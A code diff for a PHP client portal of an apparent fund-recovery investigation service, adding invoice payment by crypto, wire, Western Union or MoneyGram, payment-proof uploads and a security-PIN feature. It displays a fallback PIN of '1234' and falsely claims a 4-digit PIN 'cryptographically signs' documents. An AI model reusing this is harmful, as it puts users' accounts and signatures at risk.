+                                        <?php elseif($st==='overdue'): ?><i class="fas fa-exclamation-circle mr-1"></i>Overdue
+                                        <?php else: ?><i class="fas fa-clock mr-1"></i>Unpaid<?php endif; ?>
+                                    </span>
+                                </td>
+                                <td>
+                                    <a href="/client/invoice_view.php?id=<?= $inv['id'] ?>" class="btn btn-sm btn-outline-secondary mr-1" title="View Invoice">
+                                        <i class="fas fa-eye"></i>
+                                    </a>
+                                    <?php if ($inv['status'] !== 'paid'): ?>
+                                        <button type="button" class="btn btn-sm pay-btn" 
+                                            onclick="showPayModal(<?= $inv['id'] ?>, '<?= htmlspecialchars(addslashes('#INV-'.str_pad($inv['id'],5,'0',STR_PAD_LEFT))) ?>', <?= $total_due ?>, <?= htmlspecialchars(json_encode($inv['payment_info'] ?? $global_payment_info)) ?>)">
+                                            <i class="fas fa-credit-card mr-1"></i> Pay
+                                        </button>
+                                    <?php endif; ?>
+                                </td>
+                            </tr>
+                            <?php endforeach; ?>
+                        </tbody>
+                    </table>
                 </div>
+             <?php endif; ?>
+             
+             <!-- PAYMENT PROOF HISTORY -->
+             <?php
+             $proofs = [];
+             try {
+                 $stmtP = $pdo->prepare("SELECT p.*, i.invoice_number FROM IFW_invoice_payments p JOIN IFW_invoices i ON p.invoice_id = i.id WHERE p.client_id = ? ORDER BY p.created_at DESC");
+                 $stmtP->execute([$client_id]);
+                 $proofs = $stmtP->fetchAll();
+             } catch(Exception $e) {}
+             ?>
+             <?php if (!empty($proofs)): ?>
+                 <div class="card-header bg-dark border-bottom py-3 d-flex justify-content-between align-items-center text-warning border-top border-secondary mt-3">
+                     <h6 class="mb-0 font-weight-bold"><i class="fas fa-history text-warning mr-2"></i>Payment Verification History</h6>
+                 </div>
+                 <div class="table-responsive">
+                     <table class="table table-hover align-middle mb-0">
+                         <thead class="bg-light">
+                             <tr style="font-size:11px;" class="text-uppercase text-muted">
+                                 <th>Date</th>
+                                 <th>Invoice</th>
+                                 <th>Amount</th>
+                                 <th>Reference</th>
+                                 <th>Status</th>
+                             </tr>
+                         </thead>
+                         <tbody>
+                             <?php foreach($proofs as $pr): ?>
+                                 <tr>
+                                     <td><span class="text-muted small"><?= date('M j, Y', strtotime($pr['created_at'])) ?></span></td>
+                                     <td><strong><?= htmlspecialchars($pr['invoice_number']) ?></strong></td>
+                                     <td><strong class="text-success">$<?= number_format($pr['amount'], 2) ?></strong></td>
+                                     <td><span class="badge badge-info"><?= htmlspecialchars($pr['payment_method']) ?></span><br><small class="text-muted">Ref: <?= htmlspecialchars($pr['reference_number']) ?></small></td>
+                                     <td>
+                                         <?php if ($pr['status'] === 'Pending'): ?>
+                                             <span class="badge badge-warning text-dark"><i class="fas fa-clock mr-1"></i> Pending Verification</span>
+                                         <?php elseif ($pr['status'] === 'Confirmed'): ?>
+                                             <span class="badge badge-success"><i class="fas fa-check-circle mr-1"></i> Approved</span>
+                                         <?php else: ?>
+                                             <span class="badge badge-danger" title="<?= htmlspecialchars($pr['notes'] ?? '') ?>"><i class="fas fa-times-circle mr-1"></i> Rejected</span>
+                                         <?php endif; ?>
+                                     </td>
+                                 </tr>
+                             <?php endforeach; ?>
+                         </tbody>
+                     </table>
+                 </div>
+             <?php endif; ?>
+         </div>
+     </div>
+
+    <!-- RIGHT SIDEBAR -->
+    <div class="col-lg-4">
+
+        <!-- CASE SUMMARY CARD -->
+        <?php if ($latest_case): ?>
+        <div class="card shadow-sm border-0 mb-4">
+            <div class="card-header bg-dark text-warning border-0 font-weight-bold py-3">
+                <i class="fas fa-briefcase mr-2"></i>Current Case Status
+            </div>
+            <div class="card-body bg-dark text-white">
+                <div class="mb-3">
+                    <div class="text-muted small text-uppercase mb-1" style="font-size:10px;">Case Reference</div>
+                    <div class="font-weight-bold text-warning" style="font-size:1.1rem;"><?= htmlspecialchars($latest_case['case_number'] ?? 'IFW-'.str_pad($latest_case['id'],5,'0',STR_PAD_LEFT)) ?></div>
+                </div>
+                <div class="mb-3">
+                    <div class="text-muted small text-uppercase mb-1" style="font-size:10px;">Case Title</div>
+                    <div class="font-weight-bold"><?= htmlspecialchars($latest_case['title']) ?></div>
+                </div>
+                <div class="mb-3">
+                    <div class="text-muted small text-uppercase mb-1" style="font-size:10px;">Status</div>
+                    <?php
+                    $s = strtolower($latest_case['status'] ?? 'pending');
+                    $badge = ['pending'=>'warning text-dark','in progress'=>'info','active'=>'info','resolved'=>'success','closed'=>'secondary'][$s] ?? 'secondary';
+                    ?>
+                    <span class="badge badge-<?= $badge ?> px-3 py-1" style="font-size:13px;"><?= htmlspecialchars(ucwords($latest_case['status'] ?? 'Pending')) ?></span>
+                </div>
+                <?php if (!empty($latest_case['agent_name'])): ?>
+                <div class="mb-3">
+                    <div class="text-muted small text-uppercase mb-1" style="font-size:10px;">Assigned Investigator</div>
+                    <div class="font-weight-bold"><i class="fas fa-user-tie mr-1 text-warning"></i><?= htmlspecialchars($latest_case['agent_name']) ?></div>
+                </div>
+                <?php endif; ?>
+                <?php if (!empty($latest_case['amount_lost']) && $latest_case['amount_lost'] > 0): ?>
+                <div class="mb-3">
+                    <div class="text-muted small text-uppercase mb-1" style="font-size:10px;">Reported Loss</div>
+                    <div class="font-weight-bold text-danger">$<?= number_format($latest_case['amount_lost'],2) ?> <?= htmlspecialchars($latest_case['currency'] ?? 'USD') ?></div>
+                </div>
+                <?php endif; ?>
+                <?php if (!empty($latest_case['amount_recovered']) && $latest_case['amount_recovered'] > 0): ?>
+                <div class="mb-3">
+                    <div class="text-muted small text-uppercase mb-1" style="font-size:10px;">Amount Recovered</div>
+                    <div class="font-weight-bold text-success">$<?= number_format($latest_case['amount_recovered'],2) ?></div>
+                </div>
+                <?php endif; ?>
+                <a href="/client/my_cases.php?case_id=<?= $latest_case['id'] ?>" class="btn btn-warning btn-sm font-weight-bold text-dark w-100 mt-2 shadow-sm">
+                    <i class="fas fa-search mr-1"></i> View Full Case Details
+                </a>
             </div>
         </div>
         <?php endif; ?>
+
+        <!-- ASSIGNED INVESTIGATOR -->
+        <div class="card shadow-sm border-0 mb-4">
+            <div class="card-body text-center py-4">
+                <div style="width:64px;height:64px;border-radius:50%;background:linear-gradient(135deg,#fecc56,#f0a500);display:flex;align-items:center;justify-content:center;margin:0 auto 12px;">
+                    <i class="fas fa-user-shield fa-2x text-dark"></i>
+                </div>
+                <h6 class="font-weight-bold mb-1">Your Investigator</h6>
+                <?php if ($client['agent_name']): ?>
+                    <p class="text-dark font-weight-bold mb-1"><?= htmlspecialchars($client['agent_name']) ?></p>
+                    <p class="text-muted small mb-0"><i class="fas fa-envelope mr-1"></i><?= htmlspecialchars($client['agent_email'] ?? '') ?></p>
+                <?php else: ?>
+                    <p class="text-muted small mb-2">An investigator will be assigned shortly.</p>
+                    <span class="badge badge-warning text-dark">Pending Assignment</span>
+                <?php endif; ?>
+            </div>
+        <!-- PORTAL SECURITY PIN -->
+        <div class="card shadow-sm border-0 mb-4 bg-dark text-white border-warning">
+            <div class="card-header bg-dark border-bottom font-weight-bold py-3 text-warning">
+                <i class="fas fa-lock mr-2"></i>Portal Security PIN
+            </div>
+            <div class="card-body">
+                <p class="text-light small mb-3">Your 4-digit Security PIN is used to cryptographically sign case files and documents (agreements, NDAs, power of attorney).</p>
+                
+                <?php if (!empty($client['pin_hash'])): ?>
+                    <div class="alert alert-success border-0 small py-2 mb-3">
+                        <i class="fas fa-check-circle mr-1"></i> Security PIN is active & configured.
+                    </div>
+                <?php else: ?>
+                    <div class="alert alert-danger border-0 small py-2 mb-3">
+                        <i class="fas fa-exclamation-triangle mr-1"></i> No PIN configured yet. Fallback PIN is <strong class="text-white">1234</strong>.
+                    </div>
+                <?php endif; ?>
+                
+                <form action="set_pin.php" method="POST" class="mt-2">
+                    <div class="form-group mb-2">
+                        <label class="small text-muted font-weight-bold">Configure New PIN</label>
+                        <input type="password" name="new_pin" class="form-control form-control-sm bg-dark text-light border-secondary text-center font-weight-bold font-large" maxlength="4" placeholder="Enter 4-digit PIN" required pattern="\d{4}">
+                    </div>
+                    <button type="submit" class="btn btn-warning btn-sm btn-block font-weight-bold text-dark mt-2 shadow-sm">
+                        <i class="fas fa-key mr-1"></i> Save Security PIN
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <!-- PAYMENT INFORMATION -->
+        <div class="card shadow-sm border-0 mb-4">
+            <div class="card-header bg-dark border-bottom font-weight-bold py-3 text-warning">
+                <i class="fas fa-university text-warning mr-2"></i>Payment Information
+            </div>
+            <div class="card-body">
+                <?php if (!empty($bank_details) || !empty($global_payment_info)): ?>
+                    <?php if (!empty($global_payment_info)): ?>
+                        <div class="alert alert-light border mb-3 small">
+                            <strong class="d-block mb-1 text-dark"><i class="fas fa-info-circle text-warning mr-1"></i> Instructions</strong>
+                            <?= nl2br(htmlspecialchars($global_payment_info)) ?>
+                        </div>
+                    <?php endif; ?>
+                    <?php if (!empty($bank_details)): ?>
+                        <div class="bg-light p-3 rounded border small" style="white-space:pre-wrap; font-family: monospace; font-size:12px;">
+                            <?= htmlspecialchars($bank_details) ?>
+                        </div>
+                    <?php endif; ?>
+                <?php else: ?>
+                    <p class="text-muted small text-center mb-0">Payment information will be provided on your invoice.</p>
+                <?php endif; ?>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- PAY NOW MODAL -->
+<div class="modal fade" id="payNowModal" tabindex="-1">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content border-0 shadow-lg">
+            <div class="modal-header bg-dark text-warning border-0 py-3">
+                <h5 class="modal-title font-weight-bold"><i class="fas fa-credit-card mr-2"></i>Make Payment — <span id="payInvoiceRef"></span></h5>
+                <button type="button" class="close text-white" data-dismiss="modal">&times;</button>
+            </div>
+            <div class="modal-body p-0">
+                <div class="bg-dark text-white p-4 border-bottom border-secondary">
+                    <div class="d-flex justify-content-between align-items-center">
+                        <div>
+                            <div class="text-muted small text-uppercase" style="font-size:10px;">Amount Due</div>
+                            <div class="font-weight-bold text-warning" style="font-size:2rem;" id="payAmount"></div>
+                        </div>
+                        <div class="text-right">
+                            <span class="badge badge-danger px-3 py-2" style="font-size:13px;">Payment Required</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="p-4">
+                    <h6 class="font-weight-bold mb-3 text-dark"><i class="fas fa-university mr-2 text-warning"></i>Payment Details</h6>
+                    <div class="bg-light border rounded p-4 mb-4" id="paymentInfoBlock" style="white-space:pre-wrap; font-family: monospace; font-size:13px; line-height:1.8;"></div>
+                    
+                    <div class="alert alert-warning border-0 mb-4">
+                        <i class="fas fa-exclamation-triangle mr-2"></i>
+                        <strong>Important:</strong> After making payment, please upload your payment proof below so we can verify and update your invoice status.
+                    </div>
+
+                    <form method="POST" action="/api/submit_payment_proof.php" enctype="multipart/form-data">
+                        <input type="hidden" name="invoice_id" id="payInvoiceId">
+                        <div class="row">
+                            <div class="col-md-6 mb-3">
+                                <label class="font-weight-bold text-dark small">Payment Method</label>
+                                <select name="payment_method" class="form-control border-secondary" required>
+                                    <option value="">Select method...</option>
+                                    <option>Bank Wire Transfer</option>
+                                    <option>Cryptocurrency (Bitcoin)</option>
+                                    <option>Cryptocurrency (USDT)</option>
+                                    <option>Cryptocurrency (ETH)</option>
+                                    <option>Credit/Debit Card</option>
+                                    <option>Western Union</option>
+                                    <option>MoneyGram</option>
+                                    <option>Other</option>
+                                </select>
+                            </div>
+                            <div class="col-md-6 mb-3">
+                                <label class="font-weight-bold text-dark small">Transaction / Reference Number</label>
+                                <input type="text" name="reference_number" class="form-control border-secondary" placeholder="e.g. TXN12345678" required>
+                            </div>
+                        </div>
+                        <div class="mb-3">
+                            <label class="font-weight-bold text-dark small">Upload Payment Receipt / Proof</label>
+                            <input type="file" name="proof_file" class="form-control-file border p-2 rounded w-100" accept=".jpg,.jpeg,.png,.pdf,.doc,.docx" required>
+                            <small class="text-muted">Accepted: JPG, PNG, PDF, DOC (Max 10MB)</small>
+                        </div>
+                        <div class="mb-3">
+                            <label class="font-weight-bold text-dark small">Additional Notes (Optional)</label>
+                            <textarea name="notes" class="form-control border-secondary" rows="2" placeholder="Any additional notes about your payment..."></textarea>
+                        </div>
+                        <button type="submit" class="btn pay-btn btn-block font-weight-bold py-3 shadow-lg">
+                            <i class="fas fa-paper-plane mr-2"></i> Submit Payment Proof for Verification
+                        </button>
+                    </form>
+                </div>
+            </div>
+        </div>
     </div>
 </div>
 
 <!-- CHANGE PASSWORD MODAL -->
-<div class="modal fade" id="passwordModal" tabindex="-1" role="dialog" aria-hidden="true">
+<div class="modal fade" id="passwordModal" tabindex="-1">
     <div class="modal-dialog">
         <div class="modal-content">
-            <div class="modal-header bg-dark text-warning">
+            <div class="modal-header bg-dark text-warning border-0">
                 <h5 class="modal-title font-weight-bold"><i class="fas fa-key mr-2"></i>Change Password</h5>
-                <button type="button" class="close text-white" data-dismiss="modal" aria-label="Close">
-                    <span aria-hidden="true">&times;</span>
-                </button>
+                <button type="button" class="close text-white" data-dismiss="modal">&times;</button>
             </div>
             <form method="POST">
                 <input type="hidden" name="action" value="change_password">
                 <div class="modal-body bg-dark text-white">
                     <div class="form-group mb-3">
-                        <label class="font-weight-bold text-light">Current Password</label>
-                        <input type="password" name="old_password" class="form-control bg-secondary text-white border-0" required placeholder="Enter current password">
+                        <label class="font-weight-bold text-light small">Current Password</label>
+                        <input type="password" name="old_password" class="form-control bg-secondary text-white border-0" required>
                     </div>
                     <div class="form-group mb-3">
-                        <label class="font-weight-bold text-light">New Password</label>
-                        <input type="password" name="new_password" class="form-control bg-secondary text-white border-0" required placeholder="At least 6 characters">
+                        <label class="font-weight-bold text-light small">New Password</label>
+                        <input type="password" name="new_password" class="form-control bg-secondary text-white border-0" required minlength="6">
                     </div>
                     <div class="form-group mb-0">
-                        <label class="font-weight-bold text-light">Confirm New Password</label>
-                        <input type="password" name="confirm_password" class="form-control bg-secondary text-white border-0" required placeholder="Repeat new password">
+                        <label class="font-weight-bold text-light small">Confirm New Password</label>
+                        <input type="password" name="confirm_password" class="form-control bg-secondary text-white border-0" required>
                     </div>
                 </div>
                 <div class="modal-footer bg-dark border-secondary">
@@ -305,5 +727,61 @@ try {
     </div>
 </div>
 
+<!-- FIRST TIME ONBOARDING MODAL -->
+<div class="modal fade" id="onboardingModal" tabindex="-1" role="dialog" aria-labelledby="onboardingModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered">
+    <div class="modal-content bg-dark text-white border-warning">
+      <div class="modal-header border-secondary">
+        <h5 class="modal-title text-warning font-weight-bold" id="onboardingModalLabel"><i class="fas fa-shield-alt mr-2"></i>First-Time Security Configuration</h5>
+      </div>
+      <form method="POST">
+        <input type="hidden" name="action" value="setup_security">
+        <div class="modal-body">
+            <p class="small text-muted mb-3">For your security, you must change your temporary password and configure a 4-digit Security PIN before accessing the dashboard for total security and privacy .</p>
+            
+            <div class="form-group mb-3">
+                <label class="text-white font-weight-bold small">New Password</label>
+                <input type="password" name="onboarding_new_password" class="form-control bg-secondary text-white border-0" required minlength="6" placeholder="Enter new password">
+            </div>
+            
+            <div class="form-group mb-3">
+                <label class="text-white font-weight-bold small">Confirm Password</label>
+                <input type="password" class="form-control bg-secondary text-white border-0" required placeholder="Confirm new password" oninput="if(this.value !== document.getElementsByName('onboarding_new_password')[0].value){ this.setCustomValidity('Passwords do not match'); } else { this.setCustomValidity(''); }">
+            </div>
+            
+            <div class="form-group mb-3">
+                <label class="text-white font-weight-bold small">Set 4-Digit Security PIN</label>
+                <input type="password" name="onboarding_new_pin" class="form-control bg-secondary text-white border-0 text-center font-weight-bold font-large" maxlength="4" placeholder="e.g. 9876" required pattern="\d{4}">
+                <small class="text-muted d-block mt-1">This PIN is required to cryptographically sign private/personal and case related legal documents.</small>
+            </div>
+        </div>
+        <div class="modal-footer border-secondary">
+            <button type="submit" class="btn btn-warning font-weight-bold text-dark w-100 py-2"><i class="fas fa-lock-open mr-2"></i>Configure Security & Enter Dashboard</button>
+        </div>
+      </form>
+    </div>
+  </div>
+</div>
 
-<?php require_once '../includes/admin_footer.php'; ?>
+<script>
+function showPayModal(invoiceId, ref, amount, paymentInfo) {
+    document.getElementById('payInvoiceId').value = invoiceId;
+    document.getElementById('payInvoiceRef').textContent = ref;
+    document.getElementById('payAmount').textContent = '$' + parseFloat(amount).toLocaleString('en-US', {minimumFractionDigits: 2});
+    document.getElementById('payAmountInput').value = parseFloat(amount).toFixed(2);
+    document.getElementById('paymentInfoBlock').textContent = paymentInfo || 'Please contact your assigned investigator for payment details.';
+    $('#payNowModal').modal('show');
+}
+
+$(document).ready(function() {
+    <?php if (empty($client['pin_hash'])): ?>
+        $('#onboardingModal').modal({
+            backdrop: 'static',
+            keyboard: false
+        });
+        $('#onboardingModal').modal('show');
+    <?php endif; ?>
+});
+</script>
+
+<?php require_once $dir . '/includes/admin_footer.php'; ?>
